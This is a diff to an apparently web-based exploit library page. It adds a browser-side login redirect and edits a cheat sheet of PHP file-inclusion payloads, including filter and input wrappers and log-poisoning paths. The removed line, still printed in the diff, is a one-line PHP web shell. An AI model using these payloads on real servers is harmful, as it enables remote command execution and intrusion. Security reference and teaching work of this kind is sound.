@@ -6,6 +6,14 @@
     <title>Biblioteca de Exploits - DeepEyes</title>
     <link rel="icon" type="image/png" href="/logo.png">
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>html:not(.auth-checked) body { visibility: hidden; }</style>
+    <script>
+        if (!localStorage.getItem('token')) {
+            window.location.replace('/?login=required');
+        } else {
+            document.documentElement.classList.add('auth-checked');
+        }
+    </script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         :root {
@@ -579,7 +587,7 @@ frida -U -f com.target.app -l bypass.js --no-pause`,
 # Wrapper PHP
 php://filter/convert.base64-encode/resource=index.php
 php://input (POST data como código)
-data://text/plain,<?php system($_GET['cmd']); ?>
+data://text/plain,[PHP_WEBSHELL]
 
 # Log poisoning
 /var/log/apache2/access.log
